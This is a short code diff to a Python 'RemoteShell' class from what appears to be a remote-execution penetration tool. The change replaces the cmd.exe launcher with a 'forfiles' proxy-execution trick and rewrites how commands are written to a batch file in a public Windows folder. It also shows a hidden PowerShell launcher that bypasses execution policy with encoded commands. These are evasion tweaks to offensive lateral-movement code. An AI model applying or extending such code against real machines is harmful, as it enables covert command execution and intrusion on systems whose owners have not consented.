@@ -181,7 +181,7 @@ class RemoteShell(cmd.Cmd):
         self.__outputBuffer = b''
         self.__command = ''
         # Might also use wt.exe (wt.exe cmd /c c:\windows\system32\calc.exe)
-        self.__shell = 'C:\\Windows\\System32\\conhost.exe C:\\Windows\\System32\\cmd.exe /Q /c '
+        self.__shell = 'forfiles /p C:\\Windows\\ /m win.ini /c '
         self.__shell_type = shell_type
         self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
         self.__serviceName = serviceName
@@ -283,7 +283,7 @@ class RemoteShell(cmd.Cmd):
 
         batchFile = 'C:\\Users\\Public\\Downloads\\AlwaysUp2.bat'
                 
-        command = self.__shell + 'echo powershell.exe -command ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
+        command = self.__shell + '"cmd /c echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
                   self.__shell + batchFile
 
         if self.__mode == 'SERVER':
